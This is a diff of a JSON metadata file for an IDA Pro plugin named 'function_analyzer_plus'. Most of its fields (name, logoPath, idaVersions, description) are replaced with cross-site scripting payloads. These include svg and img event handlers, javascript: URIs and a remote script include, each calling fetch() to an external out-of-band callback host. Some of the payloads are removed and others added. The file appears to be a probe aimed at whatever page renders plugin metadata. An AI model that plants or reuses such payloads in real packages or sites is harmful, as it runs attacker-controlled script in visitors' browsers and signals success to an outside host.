@@ -1,7 +1,7 @@
 {
   "IDAMetadataDescriptorVersion": 1,
   "plugin": {
-    "name": "</script><svg/onload=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com?svg')>",
+    "name": "</script><img src=x onerror=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/name')>",
     "entryPoint": "function_analyzer_plus.py",
     "categories": [
       "disassembly-and-processor-modules",
@@ -9,8 +9,9 @@
       "debugging-and-tracing"
     ],
     "logoPath": "javascript:fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/logo')",
-    "idaVersions": "\"><img src=x onerror=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/ida')>",
-    "description": "☠<svg/onload=alert(1)>--><script>alert('xss')</script><iframe/src=javascript:alert`xss`>//</iframe><img src=x onerror=alert(1)><body onload=alert(1)>\"'><svg/onload=fetch(`//axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com?onload`)><!--<script>--></script><style>@import'javascript:alert(1)';</style><object data=javascript:alert(1)><a href=\"javascript:alert(1)\">ClickMe</a><meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\"><input autofocus onfocus=alert(document.domain)><!--\"--><script src=\"//axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/x.js\"></script><!--",
+    "idaVersions": "^8.4.0",
+    "description": "<svg/onload=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/desc')>"
+    ,
     "version": "1.1.4"
   }
 }
